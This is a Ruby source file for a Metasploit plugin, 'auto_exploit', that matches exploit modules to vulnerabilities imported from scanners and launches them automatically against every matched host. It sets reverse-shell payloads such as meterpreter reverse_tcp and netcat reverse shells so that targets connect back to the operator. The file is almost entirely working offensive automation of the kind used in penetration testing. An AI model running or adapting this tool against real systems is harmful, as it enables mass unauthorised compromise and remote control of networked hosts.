module Msf

    class Plugin::PostCommand < Msf::Plugin
	
        class VulnExploit
            include Msf::Ui::Console::CommandDispatcher
		
            # Set name for command dispatcher
            def name
                "auto_exploit"
            end
		
            # Define Commands
            def commands
                {
                    "vuln_exploit" => "Runs exploits based on data imported from vuln scanners."
                }
            end
		
            # Multi shell command
            def cmd_vuln_exploit(*args)
                require 'timeout'

                # Define options
                opts = Rex::Parser::Arguments.new(
                    "-f"   => [ true,	"Provide a comma separated list of IP's and Ranges to skip when running exploits."],
                    #"-r"   => [ true,   "Minimun Rank than an exploit needs to have to match."],
                    "-l"   => [ true,    "Provide the LHOST value for the payloads used."],
                    "-s"   => [ false,    "Do not limit number of sessions to one per target."],
                    #"-po"  => [ true,   "Additional Payload Options."],
                    "-h"   => [ false,  "Command Help"]
                )
			
                # set variables for options
                os_type = ""
                filter = []
                range = []
                lhost = ""
                limit_sessions = true
                matched_exploits = []
                # Parse options
                opts.parse(args) do |opt, idx, val|
                    case opt
					when "-f"
						range = val.gsub(" ","").split(",")

                    when "-l"
						lhost = val

                    when "-s"
                        limit_sessions = false
						
					when "-h"
						print_line(opts.usage)
						return
                    end
                end

                # generate a list of IP's to not exploit
                range.each do |r|
                    Rex::Socket::RangeWalker.new(r).each do |i|
                        filter << i
                    end
                end

                print_status("Matching Exploits (This will take a while depending on number of hosts)...")
                framework.db.hosts.each do |h|
                    # Check that host has vulnerabilities associated in the DB
                    if h.vulns.length > 0
                        os_type = normalise_os(h.os_name)
                        #payload = chose_pay(h.os_name)
                        framework.exploits.each_module do |x,e|
                            found = false
                            x = e.new
                            # lets filter for those exploits that are actually remote and match the OS
                            if x.fullname =~ /#{os_type}/ and x.datastore.include?('RPORT')
                                # lets get the proper references
                                e_refs = parse_references(x.references)
                                h.vulns.each do |v|
                                    v.refs.each do |f|
                                        if e_refs.include?(f.name) and not found

                                            # Skip those hosts that are filtered
                                            next if filter.include?(h.address)

                                            # Save exploits in manner easy to retreave later
                                            exploit = {
                                                :exploit => x.fullname,
                                                :port => v.service.port,
                                                :target => h.address
                                            }
                                            matched_exploits << exploit
                                            found = true
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                if matched_exploits.length > 0
                    print_good("Matched Exploits:")
                    matched_exploits.each do |e|
                        print_good("\t#{e[:target]} #{e[:exploit]} #{e[:port]}")
                    end
                else
                    print_error("No Exploits where Matched.")
                    return
                end
                port_list = (1024..65000).to_a.shuffle.first
                print_status("Running Exploits:")
                matched_exploits.each do |e|
                    if limit_sessions and get_current_sessions.include?(e[:target])
                        print_good("\tSkipping #{e[:target]} #{e[:exploit]} because a session already exists.")
                        next
                    end
                    begin
                        ex = framework.modules.create(e[:exploit])
                        ex = chose_pay(ex, e[:target])
                        ex.datastore['RHOST'] = e[:target]
                        ex.datastore['RPORT'] = e[:port].to_i
                        ex.datastore['VERBOSE'] = true
                        (ex.options.validate(ex.datastore))
                        print_status("Running #{e[:exploit]} against #{e[:target]}")
                        Timeout::timeout(20) do
                            ex.exploit_simple(
                                'Payload'       => ex.datastore['PAYLOAD'],
                                'LocalInput'    => driver.input,
                                'LocalOutput'   => driver.output,
                                'RunAsJob'      => true
                            )
                        end
                    rescue Timeout::Error
                        print_error("Exploit #{e[:exploit]} against #{e[:target]} timed out")
                    end
                end
				
            end

            # Normalize the OS name since different scanner may have entered different values.
            def normalise_os(os_name)
                case os_name
                when /(Microsoft|Windows)/i
                    os = "windows"
                when /(Linux|Ubuntu|CentOS|RedHat)/i
                    os = "linux"
                when /aix/i
                    os = "aix"
                when /(freebsd)/i
                    os = "freebsd"
                when /(hpux|hp-ux)/i
                    os = "hpux"
                when /solaris/i
                    os = solaris
                when /(Apple|OSX|OS X)/i
                    os = "osx"
                end
                return os
            end
		
            # Parse the exploit references and get a list of CVE, BID and OSVDB values that
            # we can match accurately.
            def parse_references(refs)
                references = []
                refs.each do |r|
                    # We do not want references that are URLs
                    next if r.ctx_id == "URL"
                    # Format the reference as it is saved by Nessus
                    references << "#{r.ctx_id}-#{r.ctx_val}"
                end
                return references
            end

            # Choose the proper payload
            def chose_pay(mod, rhost)
                # taken from the exploit ui mixin
                # A list of preferred payloads in the best-first order
                pref = [
                    'windows/meterpreter/reverse_tcp',
                    'java/meterpreter/reverse_tcp',
                    'php/meterpreter/reverse_tcp',
                    'php/meterpreter_reverse_tcp',
                    'cmd/unix/interact',
                    'cmd/unix/reverse',
                    'cmd/unix/reverse_perl',
                    'cmd/unix/reverse_netcat',
                    'windows/meterpreter/reverse_nonx_tcp',
                    'windows/meterpreter/reverse_ord_tcp',
                    'windows/shell/reverse_tcp',
                    'generic/shell_reverse_tcp'
                ]
                pset = mod.compatible_payloads.map{|x| x[0] }
                pref.each do |n|
                    if(pset.include?(n))
                        mod.datastore['PAYLOAD'] = n
                        mod.datastore['LHOST']   = Rex::Socket.source_address(rhost)
                        return mod
                    end
                end
            end
            # Create a payload given a name, lhost and lport, additional options
            def create_payload(name, lhost, lport, opts = "")
                puts name
                pay = framework.payloads.create(name)
                pay.datastore['LHOST'] = lhost
                pay.datastore['LPORT'] = lport
                if not opts.empty?
                    opts.split(",").each do |o|
                        opt,val = o.split("=", 2)
                        pay.datastore[opt] = val
                    end
                end
                # Validate the options for the module
                if pay.options.validate(pay.datastore)
					print_good("Payload option validation passed")	
				end
                return pay

            end

            def get_current_sessions()
                session_hosts = framework.sessions.map { |s,r| r.tunnel_peer.split(":")[0] }
                return session_hosts
            end

		end
	end

	def initialize(framework, opts)
		super
		add_console_dispatcher(VulnExploit)
		print_status("auto_exploit plugin loaded.")
	end
	
	def cleanup
		remove_console_dispatcher("auto_exploit")
	end

	def name
		"auto_exploit"
	end
	
	def desc
		"Allows for automation of running exploit modules based on information in the Database."
	end

    protected
end

